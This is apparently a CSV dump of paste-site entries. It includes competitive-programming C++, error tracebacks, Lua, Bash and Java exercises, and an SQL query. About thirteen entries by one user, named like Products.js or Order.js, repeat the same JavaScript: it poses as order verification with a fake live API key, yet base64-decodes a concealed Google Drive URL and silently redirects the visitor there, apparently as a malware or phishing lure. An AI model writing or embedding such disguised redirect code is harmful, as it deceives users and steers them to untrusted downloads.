id,title,username,language,date,content
Djw9WRf1,Untitled,Epiphemeral,JavaScript,Tuesday 15th of April 2025 10:42:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34643/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YB2zubGN,WA T6: https://codeforces.com/gym/105679/problem/E,shohagfaraji,C++,Tuesday 15th of April 2025 10:33:32 AM CDT,"#include<bits/stdc++.h>
#define ll long long
using namespace std;

void f (vector<int>&a, int n, int p, int c, int l, int r) {
  int i = p + c, lim = (c < 0 ? 1 : n);
  while (i != lim + c) {
    if (l >= 1) {
      a[i] = l;
      l--;
    } else if (r <= n) {
      a[i] = r;
      r++;
    } else break;
    i += c;
  }
  c = (c < 0 ? 1 : -1);
  lim = (c < 0 ? 1 : n);
  i = p + c;
  while (i != lim + c) {
    if (l >= 1) {
      a[i] = l;
      l--;
    } else if (r <= n) {
      a[i] = r;
      r++;
    } else break;
    i += c;
  }
}

//10 7 3
//Yes
//7 6 5 4 1 2 3 8 9 10

void Solve() {
  int n, x, y;
  cin >> n >> x >> y;
  if (y < x) {
    cout << ""No"";
    return;
  }
  cout << ""Yes"" << endl;
  vector<int> a (n + 1);
  a[x] = y;
  f (a, n, x, -1, y - 1, y + 1);
  cout << a[1];
  for (int i = 2 ; i <= n ; i++) {
    cout << "" "" << a[i];
  }
}

int main() {
  ios_base::sync_with_stdio (false);
  cin.tie (0);
  int ts = 1;
  while (ts--) {
    Solve();
    cout << endl;
  }
  return 0;
}
"
JdCMt1S3,WA T26: https://codeforces.com/gym/105679/problem/E,shohagfaraji,C++,Tuesday 15th of April 2025 10:30:34 AM CDT,"#include<bits/stdc++.h>
#define ll long long
using namespace std;

void f (vector<int>&a, int n, int p, int c, int l, int r) {
  int i = p + c, lim = (c < 0 ? 1 : n);
  while (i != lim + c) {
    if (l >= 1) {
      a[i] = l;
      l--;
    } else if (r <= n) {
      a[i] = r;
      r++;
    } else break;
    i += c;
  }
  c = (c < 0 ? 1 : -1);
  lim = (c < 0 ? 1 : n);
  i = p + c;
  while (i != lim + c) {
    if (l >= 1) {
      a[i] = l;
      l--;
    } else if (r <= n) {
      a[i] = r;
      r++;
    } else break;
    i += c;
  }
}

void Solve() {
  int n, x, y;
  cin >> n >> x >> y;
  if (x == n && (y > 1 && y < n) ) {
    cout << ""No"";
    return;
  }
  cout << ""Yes"" << endl;
  vector<int> a (n + 1);
  a[x] = y;
  f (a, n, x, -1, y - 1, y + 1);
  cout << a[1];
  for (int i = 2 ; i <= n ; i++){
    cout << "" "" << a[i];
  }
}

int main() {
  ios_base::sync_with_stdio (false);
  cin.tie (0);
  int ts = 1;
  while (ts--) {
    Solve();
    cout << endl;
  }
  return 0;
}
"
XJhUkCzL,Products.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 10:26:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83397/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
m5ZY3bUL,Error Message,nick2808,Bash,Tuesday 15th of April 2025 10:18:34 AM CDT,"raceback (most recent call last):
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/oauth2.py"", line 232, in _request_access_token
    response.raise_for_status()
    ~~~~~~~~~~~~~~~~~~~~~~~~~^^
  File ""/home/zenin/.local/lib/python3.13/site-packages/requests/models.py"", line 1024, in raise_for_status
    raise HTTPError(http_error_msg, response=self)
requests.exceptions.HTTPError: 400 Client Error: Bad Request for url: https://accounts.spotify.com/api/token

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/usr/bin/beatprints"", line 8, in <module>
    sys.exit(main())
             ~~~~^^
  File ""/usr/lib/python3.13/site-packages/cli/prompt.py"", line 259, in main
    create_poster()
    ~~~~~~~~~~~~~^^
  File ""/usr/lib/python3.13/site-packages/cli/prompt.py"", line 249, in create_poster
    album = select_album(conf.SEARCH_LIMIT)
  File ""/usr/lib/python3.13/site-packages/cli/prompt.py"", line 93, in select_album
    result = sp.get_album(query, limit, shuffle)
  File ""/usr/lib/python3.13/site-packages/BeatPrints/spotify.py"", line 200, in get_album
    result = self.spotify.search(q=query, type=""album"", limit=limit)
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/client.py"", line 604, in search
    return self._get(
           ~~~~~~~~~^
        ""search"", q=q, limit=limit, offset=offset, type=type, market=market
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    )
    ^
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/client.py"", line 324, in _get
    return self._internal_call(""GET"", url, payload, kwargs)
           ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/client.py"", line 250, in _internal_call
    headers = self._auth_headers()
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/client.py"", line 241, in _auth_headers
    token = self.auth_manager.get_access_token(as_dict=False)
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/oauth2.py"", line 207, in get_access_token
    token_info = self._request_access_token()
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/oauth2.py"", line 236, in _request_access_token
    self._handle_oauth_error(http_error)
    ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^
  File ""/home/zenin/.local/lib/python3.13/site-packages/spotipy/oauth2.py"", line 117, in _handle_oauth_error
    raise SpotifyOauthError(
    ...<3 lines>...
    )
spotipy.exceptions.SpotifyOauthError: error: invalid_client, error_description: None"
we0xFbk8,Order.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 10:10:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05742/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1TsvZzdr,Market.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 09:55:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91073/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fkY2P0Lz,Untitled,Epiphemeral,JavaScript,Tuesday 15th of April 2025 09:40:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39682/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dVaKB9aR,EC failed hot-refresh fix,Aoki1337,Lua,Tuesday 15th of April 2025 09:38:46 AM CDT,"local EC_PRESERVE_MESSAGE_IN_PROGRESS = GetConVar(""easychat_preserve_message_in_progress"")
local PANEL = EasyChat.GUI.TextEntry
local self = EasyChat.GUI.TextEntry

PANEL.ValueInProgress = """"

self:AddInternalCallback(""OnArrowUp"", function(caret_pos)
	self.CaretPos = caret_pos

	if EC_PRESERVE_MESSAGE_IN_PROGRESS:GetBool() and self.HistoryPos == 0 then
		local textInProgress = self:GetTextInProgress()

		if textInProgress and #textInProgress ~= 0 and self:GetText() ~= textInProgress then
			-- bring back message in progress
			self:SetText(textInProgress)
			self:OnChange()
			self:OnValueChange(textInProgress)
			return
		end
	end

	self.HistoryPos = self.HistoryPos - 1
	self:UpdateFromHistory()
end)

self:AddInternalCallback(""OnEnter"", function(caret_pos)
	if input.IsKeyDown(KEY_LSHIFT) or input.IsKeyDown(KEY_RSHIFT) then return end

	self:SetTextInProgress("""")

	self.CaretPos = caret_pos
	self:AddHistory(self:GetText())
	self.HistoryPos = 0

	self:OnEnter()
end)

function PANEL:GetTextInProgress()
	return self.ValueInProgress
end
PANEL.GetValueInProgress = PANEL.GetTextInProgress

function PANEL:SetTextInProgress(text)
	self.ValueInProgress = text
end
PANEL.SetValueInProgress = PANEL.SetTextInProgress
"
3Ek0ypz1,apt_manager.sh,sergio_educacionit,Bash,Tuesday 15th of April 2025 09:31:48 AM CDT,"#!/bin/bash

func_yesnoexit () {
	
	# las variables locales existen solo
	# dentro de la funcion
	
	local answer=""$1""

	if [ $answer == ""y"" ] || [ $answer == ""Y"" ];then

		return 0

	elif [ $answer == ""n"" ] || [ $answer == ""N"" ];then

		return 1

	else
	
		echo Terminado.
		exit 1
	
	fi

}


apt update

read -p ""
Actualizar sistema?
'y/n' cualquier tecla para terminar.
"" sel

if func_yesnoexit $sel; then

	apt upgrade -y

fi


read -p ""
Resolver dependencias?
'y/n' cualquier tecla para terminar.
"" sel

if func_yesnoexit $sel; then

	apt intall -f -y

fi



read -p ""
Eliminar paquetes huerfanos?
'y/n' cualquier tecla para terminar.
"" sel

if func_yesnoexit $sel; then

	apt autoremove -f -y

fi

echo ""
Programa terminado.
""
"
0yTVQTpi,Products.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 09:24:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07778/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SiqrJqTV,Order.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 09:08:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55760/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QQtTfw6x,elif.sh,sergio_educacionit,Bash,Tuesday 15th of April 2025 08:59:05 AM CDT,"#!/bin/bash



read -p ""Elija una opcion:

	1) opcion 1
	2) opcion 2
"" x 


if [ ""$x"" -eq 1 ]; then

    echo ""opcion 1""

elif [ ""$x"" -eq 2 ]; then

    echo ""opcion 2""

else
    echo ""debe elegir opcion 1 o 2""

fi"
SyAHvBvc,Market.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 08:52:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42652/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VPWdsMUj,Untitled,Epiphemeral,JavaScript,Tuesday 15th of April 2025 08:37:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12517/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WRZVaJMU,Products.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 08:21:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55122/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
54m5TivE,Order.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 08:05:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26218/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CzzBagfR,2025-04-15T18:04:31.990215,powerampache,PHP,Tuesday 15th of April 2025 08:04:34 AM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.ScrobbleException: {""errorAction"":""record_play"",""errorCode"":""4701"",""errorMessage"":""Session Expired"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.scrobbleApiCall(SongsRepositoryImpl.kt:652)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl.access$scrobbleApiCall(SongsRepositoryImpl.kt:80)
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$scrobbleApiCall$1.invokeSuspend(Unknown Source:15)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:942)
	at android.os.Handler.dispatchMessage(Handler.java:99)
	at android.os.Looper.loopOnce(Looper.java:201)
	at android.os.Looper.loop(Looper.java:288)
	at android.app.ActivityThread.main(ActivityThread.java:7983)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:860)

scrobble() - "
V8FUAwkZ,java实验六,wyx0311,Java,Tuesday 15th of April 2025 08:01:46 AM CDT,"package org.example;
import java.io.*;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) throws IOException {
        String source_filename = ""D://Hello.txt"";
        String target_filename = ""D://Hello.txt"";

        System.out.println(""请输入源文件地址 "");
        source_filename = ( new Scanner(System.in)).nextLine();
        System.out.println(""请输入目标文件地址 "");
        target_filename = ( new Scanner(System.in)).nextLine();


        FileReader fr = new FileReader(source_filename);
        BufferedReader br = new BufferedReader(fr);

        FileWriter fw = new FileWriter(target_filename, true);
        BufferedWriter bw = new BufferedWriter(fw);




        String line;
        while((line = br.readLine())!=null){
            bw.write(line);
            bw.newLine();
            System.out.println(line);
        }

        bw.flush();

        br.close();
        fr.close();
        bw.close();
        fw.close();
    }
}"
8n9SacZ0,Market.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 07:50:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51293/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fVzZ1Een,Untitled,Epiphemeral,JavaScript,Tuesday 15th of April 2025 07:34:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/36714/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9znHDVkm,SQL Werahouse,horozov86,SQL,Tuesday 15th of April 2025 07:31:53 AM CDT,"--select
--afaktura.CHANGEDAT,
--afaktura.EXTFAKTURANR
--from atour
--left join atasend on atour.nr = atasend.tournr
--left join ASDGABRECHNUNG on atasend.nr = ASDGABRECHNUNG.ATAID
--left join afaktura on ASDGABRECHNUNG.FK_IDAFAKTURA = afaktura.IDAFAKTURA
--where atour.TOURNUMMER = 489160

select  distinct atour.tournummer
from atour 
left join atasend on atour.nr = atasend.tournr 
left join asendung on atasend.ASENDUNGID = asendung.SENDUNGID 
left join akopf on asendung.AKOPFNR  = akopf.nr
where atour.lockstatus = 1
and akopf.auftragsnummer in (1080409,1084875,1085647,1090338,1090387,1092018,1092351,1092767,1093869,1094120,1094288,1094724,1095017,1095394,1095670,1095773,1096148,1096422,1096789,1096794,1096982,1097284,1098300,1098416,1098431,1098448,1098673,1098894,1098913,1098960,1099139,1099163,1099251,1099294,1099493,1099493,1099493,1099600,1099646,1099731,1100118,1100135,1100204,1100204,1100282,1100724,1100794,1100813,1100815,1100852,1101173,1101802,1101896,1102012,1102930,1103495,1103595,1103690,1103778,1103900,1103998,1104378,1104477,1104524,1104597,1104686,1105092,1105139,1105326,1105359,1105367,1105801,1105900,1106213,1106551,1106706,1106905,1106965,1107027,1107609,1108087,1108098,1108152,1108337,1108405,1108420,1108439,1108797,1108882,1108970,1109229,1109434,1109490,1109546,1110153,1110183,1110225,1110228,1110362,1110435,1110575,1110839,1111041,1111096,1111291,1111579,1111634,1112013,1112080,1112203,1112238,1112323,1112633,1112811,1113202,1113209,1113318,1113318,1113318,1113433,1113510,1113577,1113577,1113713,1114028,1114092,1114228,1114342,1114544,1114660,1114688,1114780,1114959,1115067,1115200,1115295,1115662,1116231,1117359,1119314,1119332);

"
